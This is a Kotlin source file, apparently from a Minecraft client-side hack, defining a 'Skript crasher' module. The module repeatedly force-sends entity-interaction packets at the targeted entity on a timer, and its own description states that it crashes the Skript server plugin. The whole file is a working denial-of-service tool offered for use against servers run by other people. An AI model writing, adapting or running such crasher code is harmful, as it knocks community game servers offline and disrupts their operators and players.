package su.mandora.tarasande_crasher.module

import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket
import net.minecraft.util.Hand
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.mc
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil
import su.mandora.tarasande_crasher.forcePacket

class ModuleSkriptCrasher : Module("Skript crasher", "Crashes the Skript plugin", "Crasher") {
    private val delay = ValueNumber(this, "Delay", 5.0, 50.0, 100.0, 5.0)

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }

        registerEvent(EventUpdate::class.java) {
            if (timer.hasReached(delay.value.toLong())) {
                mc.targetedEntity?.apply {
                    forcePacket(PlayerInteractEntityC2SPacket.interact(this, mc.player!!.isSneaking, Hand.MAIN_HAND))
                }
                timer.reset()
            }
        }
    }
}
